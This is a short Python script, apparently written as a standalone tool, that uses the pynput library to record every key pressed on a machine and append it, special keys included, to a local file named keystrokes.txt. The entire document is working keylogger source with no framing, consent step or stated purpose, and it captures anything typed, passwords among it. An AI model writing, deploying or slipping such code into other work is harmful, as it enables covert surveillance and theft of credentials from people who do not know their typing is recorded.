from pynput import keyboard

log_file = "keystrokes.txt"  # File to save keystrokes

def on_press(key):
    try:
        # Try to log character keys (a, b, 1, etc.)
        with open(log_file, "a") as file:
            file.write(key.char)
    except AttributeError:
        # Log special keys (Enter, Shift, etc.)
        with open(log_file, "a") as file:
            file.write(f"[{key}]")

# Start key listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
